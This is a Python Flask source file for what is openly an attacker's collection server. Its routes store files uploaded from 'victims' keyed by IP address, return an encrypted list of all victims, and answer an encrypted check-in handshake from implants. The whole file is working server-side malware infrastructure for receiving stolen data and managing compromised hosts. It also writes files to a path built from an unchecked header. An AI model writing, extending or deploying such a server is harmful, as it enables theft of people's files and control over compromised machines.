from flask import Flask, request, jsonify, Response
import base64
from models.victim import Victim
from models.encryption import Encryption


app = Flask(__name__)

crypt = Encryption()


@app.route("/up", methods=["POST"])
def up():
    CurrentVictim = Victim(request.remote_addr)
    NameHeader = request.headers.get("name")
    FilePath = CurrentVictim.GetFileStoragePath(NameHeader)

    dataout = open(FilePath, 'wb')
    dataout.write(request.data)
    dataout.close()

    return '', 200


@app.route("/GetAll", methods=["GET"])
def GetAll():
    """
    Get all victims

    return:
        List[dict] = list of dicts each contains information about victim's info
    """
    data = Victim(None).AllVictims
    data = crypt.EncryptBuffer(data)
    data = base64.b64encode(data).decode("utf-8")
    return Response(data, mimetype="text/plain", status=200)


@app.route("/check", methods=["GET"])
def check():
    message = request.headers.get("cc")
    message = crypt.DecryptBuffer(message)
    if message == "Are you ready?":
        response = crypt.EncryptBuffer("yes daddy.")
        response = {"cc": response}

        return "", 200, response
    else:
        return "", 400


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=1133, debug=True)
